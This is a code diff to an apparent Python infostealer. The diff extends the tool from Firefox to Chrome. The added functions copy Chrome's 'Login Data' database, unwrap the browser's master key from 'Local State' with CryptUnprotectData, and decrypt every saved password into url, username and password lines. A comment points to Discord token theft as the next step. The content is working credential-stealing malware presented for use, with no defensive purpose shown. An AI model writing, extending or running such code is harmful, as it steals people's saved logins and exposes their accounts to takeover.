@@ -1,6 +1,6 @@
 import os
 import json
-import ctypes
+import sqlite3
 import base64
 import getpass
 import requests
@@ -48,8 +48,12 @@ def find_profiles(browser_paths):
                 for name in os.listdir(path):
                     p = os.path.join(path, name)
                     if os.path.isdir(p):
-                        if all(os.path.exists(os.path.join(p, f)) for f in ['logins.json', 'key4.db', 'cert9.db']):
-                            profiles.append((browser, p))
+                        if browser == 'Chrome':
+                            if os.path.exists(os.path.join(p, 'Login Data')):
+                                profiles.append((browser, p))
+                        else:
+                            if all(os.path.exists(os.path.join(p, f)) for f in ['logins.json', 'key4.db', 'cert9.db']):
+                                profiles.append((browser, p))
         log_info(f"Found browser profiles: {len(profiles)}")
     except Exception as e:
         log_error(f"Error finding profiles: {str(e)}")
@@ -68,7 +72,60 @@ def setup_nss(profile_path):
         log_error(f"Error setting up NSS: {str(e)}")
         return None
 
-def decrypt_logins(profile_path, nss):
+def decrypt_chrome_password(encrypted_value, key):
+    try:
+        iv = encrypted_value[3:15]
+        payload = encrypted_value[15:]
+        cipher = AES.new(key, AES.MODE_GCM, iv)
+        decrypted_pass = cipher.decrypt(payload)[:-16].decode()
+        return decrypted_pass
+    except Exception as e:
+        log_error(f"Error decrypting Chrome password: {str(e)}")
+        return ""
+
+def get_chrome_key(profile_path):
+    try:
+        local_state_path = os.path.join(os.path.dirname(profile_path), 'Local State')
+        with open(local_state_path, 'r', encoding='utf-8') as f:
+            local_state = json.load(f)
+        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        key = CryptUnprotectData(key[5:], None, None, None, 0)[1]
+        return key
+    except Exception as e:
+        log_error(f"Error getting Chrome master key: {str(e)}")
+        return None
+
+def decrypt_chrome_logins(profile_path):
+    results = []
+    try:
+        login_db = os.path.join(profile_path, 'Login Data')
+        temp_db = os.path.join(tempfile.gettempdir(), 'Login Data')
+        with open(login_db, 'rb') as src, open(temp_db, 'wb') as dst:
+            dst.write(src.read())
+        
+        key = get_chrome_key(profile_path)
+        if not key:
+            return results
+        
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+        for row in cursor.fetchall():
+            url, username, encrypted_password = row
+            if url and username and encrypted_password:
+                password = decrypt_chrome_password(encrypted_password, key)
+                if password:
+                    results.append(f"{url} | {username} | {password}")
+        conn.close()
+        os.remove(temp_db)
+        log_info(f"Extracted Chrome logins from profile {profile_path}: {len(results)}")
+    except Exception as e:
+        log_error(f"Error decrypting Chrome logins: {str(e)}")
+    return results
+
+def decrypt_logins(browser, profile_path, nss=None):
+    if browser == 'Chrome':
+        return decrypt_chrome_logins(profile_path)
     results = []
     try:
         with open(os.path.join(profile_path, 'logins.json'), 'r', encoding='utf-8') as f:
@@ -531,10 +588,15 @@ async def main():
             profiles = find_profiles(browser_paths)
             for browser, profile in profiles:
                 try:
-                    nss = setup_nss(profile)
-                    if nss:
-                        res = decrypt_logins(profile, nss)
-                        browser_data[browser] = browser_data.get(browser, []) + res
+                    if browser == 'Chrome':
+                        res = decrypt_logins(browser, profile)
+                    else:
+                        nss = setup_nss(profile)
+                        if nss:
+                            res = decrypt_logins(browser, profile, nss)
+                        else:
+                            continue
+                    browser_data[browser] = browser_data.get(browser, []) + res
                 except Exception as e:
                     log_error(f"Error processing profile {profile}: {str(e)}")
             # Discord tokens
